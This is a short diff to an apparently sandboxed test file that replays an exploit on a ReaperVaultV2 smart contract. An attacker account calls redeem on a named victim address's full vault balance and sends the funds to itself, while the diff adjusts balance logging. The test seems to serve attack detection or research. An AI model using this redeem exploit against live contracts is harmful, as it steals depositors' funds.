@@ -23,11 +23,11 @@ describe('CCA Detects Sandbox Attack Test', async function () {
 
     it('should attacker abuse the ReaperVaultV2 contract', async function () {
         victim = await ethers.getAddress('0x59cb9F088806E511157A6c92B293E5574531022A')
-        console.log('Attacker USDC balance', await usdc.balanceOf(victim))
-        console.log('Victim ReaperUSDCVault balance', await reaperVault.balanceOf(victim))
+        console.log('Attacker USDC balance', await usdc.balanceOf(attacker))
         let victimBalance = await reaperVault.balanceOf(victim)
+        console.log('Victim ReaperUSDCVault balance', victimBalance)
         await reaperVault.connect(attacker).redeem(victimBalance, attacker.getAddress(), victim)
-        console.log('Attacker USDC balance', await usdc.balanceOf(victim))
+        console.log('Attacker USDC balance', await usdc.balanceOf(attacker.getAddress()))
         console.log('Victim ReaperUSDCVault balance', await reaperVault.balanceOf(victim))
     })
 })
